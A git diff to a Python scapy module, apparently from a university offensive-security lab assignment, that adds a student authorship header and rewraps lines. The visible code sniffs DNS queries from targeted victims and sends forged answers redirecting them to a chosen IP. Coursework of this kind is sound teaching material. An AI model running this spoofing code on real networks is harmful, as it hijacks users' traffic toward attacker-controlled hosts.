@@ -1,3 +1,12 @@
+"""
+Assignment for course 2IC80, Lab on Offensive Computer Security, at TU/e
+Created by;
+Daan Boelhouwers(1457152), d.boelhouwers@student.tue.nl
+Richard Farla(1420380), r.farla@student.tue.nl
+Ivar de Win(1406663), i.j.f.d.win@student.tue.nl
+"""
+
+
 from scapy import packet
 from scapy.layers.dns import DNSRR, DNSQR, DNS
 from scapy.layers.inet import IP, UDP
@@ -52,7 +61,8 @@ class DNSSpoofing(threading.Thread):
                 resp_ip = IP(src=req_ip.dst, dst=req_ip.src)
                 resp_udp = UDP(sport=req_udp.dport, dport=req_udp.sport)
                 resp_dnsrr = DNSRR(rrname=req_dnsqr.qname, rdata=redirect_ip)
-                resp_dns = DNS(qr=1, id=req_dns.id, qd=req_dnsqr, an=resp_dnsrr)
+                resp_dns = DNS(qr=1, id=req_dns.id,
+                               qd=req_dnsqr, an=resp_dnsrr)
                 spoofed_resp = resp_ip / resp_udp / resp_dns
 
                 return spoofed_resp
@@ -67,7 +77,8 @@ class DNSSpoofing(threading.Thread):
             if not (received_packet[IP].src in self.victims):
                 return
 
-            spoofed_ans = create_spoofed_dns_answer(self.redirect_ip, received_packet)
+            spoofed_ans = create_spoofed_dns_answer(
+                self.redirect_ip, received_packet)
             send(spoofed_ans, iface=self.interface, verbose=False)
             print(f"Spoofed DNS request sent by host {received_packet[IP].src} for "
                   f"{received_packet[DNSQR].qname.decode('utf8')[:-1]}")
@@ -77,4 +88,5 @@ class DNSSpoofing(threading.Thread):
             if self.is_stopped():
                 print("Stopped DNS spoofing")
                 return
-            sniff(iface=self.interface, prn=dns_spoof, filter="udp port 53", store=0, timeout=1)
+            sniff(iface=self.interface, prn=dns_spoof,
+                  filter="udp port 53", store=0, timeout=1)
